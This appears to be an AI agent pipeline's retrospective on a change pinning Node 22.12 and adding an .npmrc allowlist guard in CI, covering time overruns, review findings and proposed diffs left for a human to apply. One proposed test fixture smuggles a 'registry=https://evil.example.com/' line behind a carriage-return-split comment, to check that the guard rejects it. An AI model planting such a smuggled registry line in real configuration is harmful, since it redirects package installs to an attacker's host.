# Retro: pin node 22.12 minimum

Change id: `2026-09-20-pin-node-22-12-minimum`
Trigger: G4 approval, plus deploy-phase blocks resolved by the owner outside the pipeline

## What happened

The change pinned Node 22.12 as the floor for lint, added a CI guard (`check-npmrc.mjs`) that
allowlists the committed `.npmrc` before `npm ci` runs, and updated the deploy workflow to read
the Node version from `.nvmrc`. Build hit a harness block on `.npmrc` and a Windows-specific test
env leak; review found and fixed ten findings across two rounds, including a high-severity
parser bug the shipper caught after a green verification. The branch was ready and G4-approved
well before it published: `git push` was refused by the `ask_commands` hook three times in ship
and deploy mode, so the owner published the branch, opened PR 11, and squash-merged it to `main`
at `7ea3583` by hand, after which the Pages workflow (run `35536692240`) succeeded including this
change's own new steps.

## Clock

Confirmed via `node "C:/Users/alqai/WorkHorse/scripts/wh.js" status --metrics` and
`wh.js digest --all` (same row, both read):

- agent_minutes: 111.8
- waiting_minutes: 393
- dead_minutes: 319.3
- gap_minutes: 129
- budget_minutes: 90
- within_budget: false

`ship.md`'s own pasted clock line (written earlier, before the deploy-phase blocks below) reads
"agents 1 h 43 m of 1 h 30 m budget (OVER, by 13 m) ... dead 3 h 55 m ... unexplained gaps 2 h
09 m." The 103-minute figure there and the 111.8-minute figure in the live metrics differ because
more agent time (the deploy-mode shipper dispatch) ran after `ship.md` was written; both are
confirmed reads of real artifacts, not a contradiction. Note: the task brief for this retro cited
188.9 agent minutes and 238.3 dead minutes; neither figure matches `wh.js status --metrics` or
`wh.js digest --all` as read directly (confirmed above), so that summary was not accurate and
this retro uses the tool output instead.

Against the 90-minute tier 2 budget, agent work itself (111.8 min) was only about 22 minutes over
- a normal-sized overrun, not the story. The 129-minute unexplained gap and 393 minutes of
waiting dwarf it, and per `conductor-log.md` almost all of the gap and a large share of the
waiting sit in three identifiable blocks rather than in agent work:

1. **Design to G2 approval**: `conductor-log.md:12-14`, brief presented 05:31, resumed after G2
   approval 10:23 — about 4h52m of waiting on the human, not the agents.
2. **The `.npmrc` harness block mid-build**: `conductor-log.md:16-24`, T1 blocked at 10:32,
   resumed only after the owner created `.npmrc` by hand at 10:45 (`conductor-log.md:24`) — short
   in wall time but it held wave 2 and forced a partial fold.
3. **The branch-publish block from G4 approval to merge**: `conductor-log.md:45-54`, G4 presented
   15:31, approved 19:21, blocked again in deploy mode at 19:28, and not cleared until the owner
   published, opened, and merged the PR by hand, confirmed resolved at 20:52 (`conductor-log.md:
   54-56`) — the largest single span, and the direct cause of the 129-minute gap and much of the
   dead time between G4 approval and the final deploy-record correction.

Judgment: this run is over budget almost entirely on account of human turnaround and two
structural tool blocks (`.npmrc`, `git push`), not on agent inefficiency. The 22-minute agent
overrun on top of that is unremarkable for a tier 2 change with a two-round fix loop.

## What the pipeline caught

| Phase | Finding | Would a human have caught it? |
|-------|---------|-------------------------------|
| Build | `check-npmrc.mjs` accepted `.npmrc` with a debug-commented `engine-strict` line, silently claiming the floor was enforced when it was not (`wh-bug-reviewer.md:10`) | Believed, not verified: plausible on a careful manual review of the script, unlikely on a routine one, since the bug is an absence (no positive check) rather than a wrong check |
| Build | Windows uppercase `NPM_CONFIG_*` leaking into a test fixture child process (`conductor-log.md:26`) | Believed, not verified: only if the reviewer ran the suite on Windows; a POSIX-only reviewer would not have seen it |
| Review round 1 | Ten findings (3 high, 7 medium) across bug/security/adoption/pr-test reviewers, all fixed (`conductor-log.md:32-35`) | Believed, not verified: a solo human review of a tier 2 change this size plausibly catches some but not all ten in one pass |
| Ship | CR-splitting bypass in `check-npmrc.mjs` found and fixed after a green verification (`conductor-log.md:38-39`, `wh-security-reviewer.md:10`) | Believed, not verified: this required constructing an adversarial fixture and running `npm config get registry` against it; a human reviewer skimming the diff would plausibly have missed it too, since four review passes and one verification run had already passed the code |

## What the pipeline missed

| Missed | Where it should have been caught | Fix |
|--------|-----------------------------------|-----|
| CR-splitting bypass in `check-npmrc.mjs` survived four reviewers (bug, security round 1, adoption, pr-test) and a green verification before the shipper found it (`conductor-log.md:32-33, 38`) | Eval design (`wh-eval-designer`) should require an adversarial line-ending/control-character case for any new parser-style CI guard, and the security reviewer's own pass should diff the guard's splitting rule against the real tool's parser source, not just read the guard's code | See instinct `parser-guard-line-splitting.md`; propose adding this case class to the eval-design skill (see below) |
| The `.npmrc` harness block cost a held wave and a partial T1 fold even though `CLAUDE.md` already carried a line naming this exact harness behavior | Design/plan step should scan the task file list for harness-blocked filenames before dispatch, not rely on the fact being documented after the first time it happened | See instinct `npmrc-block-not-preempted.md`; this is the second time this exact cost was paid on this repo |
| Branch publish blocked by `ask_commands: git push` after G4 approval, for the second time in this repo's history per the task brief | The profile's `ask_commands` rule does not distinguish a feature-branch push (no publish risk) from a push that can reach `main`; conductor handling of a G4-approved, fully-fixed change also reported a bare BLOCKED rather than naming the exact three owner actions needed | See instinct `git-push-hook-blocks-approved-ship.md` and the profile diff below |

## Proposed memory updates

Each is a diff for a human to apply; nothing here has been edited directly.

### CLAUDE.md "Mistakes to avoid"

No line is promoted this run. The two candidate instincts above confidence 0.7
(`npmrc-block-not-preempted`, `git-push-hook-blocks-approved-ship`) are refinements of a
behavior already partly documented (the `.npmrc` line already in `CLAUDE.md`) or a tooling
change better made in the profile than as a prose warning. Proposed diff, if the profile change
below is not made instead:

```diff
--- a/CLAUDE.md
+++ b/CLAUDE.md
@@ Mistakes to avoid
+- `ask_commands: git push` blocks pushing the feature branch itself, not only a push to `main`.
+  After G4 approval, expect to publish the branch, open the PR, and merge by hand; the pipeline
+  cannot do this until the profile scopes the rule to pushes that can reach `main`.
```

This line is deliberately not committed to the file by this agent; a human applies it (or applies
the profile fix instead, which would make the line unnecessary).

### .workhorse/profile.yml

```diff
--- a/.workhorse/profile.yml
+++ b/.workhorse/profile.yml
@@ ask_commands
-  - "git push"                 # a push to the default branch publishes the public site
+  - "git push origin main"     # a push to the default branch publishes the public site
+  - "git push origin HEAD:main"
+  # feature-branch pushes (git push origin wh/<id>) and gh pr create are not ask-gated:
+  # they cannot publish by themselves, only a merge to main can, and that merge still
+  # requires the owner's own action outside this pipeline.
```

Believed, not verified: this scoping is believed sufficient to stop blocking a routine
feature-branch push while still gating anything that can reach `main`, but it has not been
tested against the hook's actual matching logic (prefix match vs. exact match) in this session.
A human should confirm how the hook matches before applying.

### evals.md

Add a permanent case for the CR-splitting class, since it is now a confirmed real bypass, not a
hypothetical:

```diff
--- a/docs/sdlc/2026-09-20-pin-node-22-12-minimum/evals.md
+++ b/docs/sdlc/2026-09-20-pin-node-22-12-minimum/evals.md
@@
+| AD-CR1 | Adversarial | `.npmrc` line `# harmless comment<CR>registry=https://evil.example.com/`
+  plus a valid `engine-strict=true` line | check-npmrc.mjs rejects (exit 1), matching npm's own
+  `/[\r\n]+/` split | src/checkNpmrc.test.js | Implemented at 1dbf781, fixture confirmed by the
+  security reviewer (npm 10.7.0, Node v24.19.0) |
```

### Skill proposal (plugin, not edited here)

Describe only, for a human to fold into the plugin's eval-design or security-review skill:

Any CI guard that re-implements a config-file parser (ini, env, yaml, line-oriented formats)
should have its splitting/comment rules verified against the real tool's parser (source read or
adversarial fixture run), and the eval-design step should generate a control-character /
line-ending adversarial case for it by default, the same way it already generates injection and
oversized-input cases for other input classes. This is client-independent: it would apply to any
project shipping a parser-style guard script, not just this repository's `.npmrc` allowlist.

## New evals

- `AD-CR1` proposed above for `docs/sdlc/2026-09-20-pin-node-22-12-minimum/evals.md` (diff only,
  not applied by this agent).
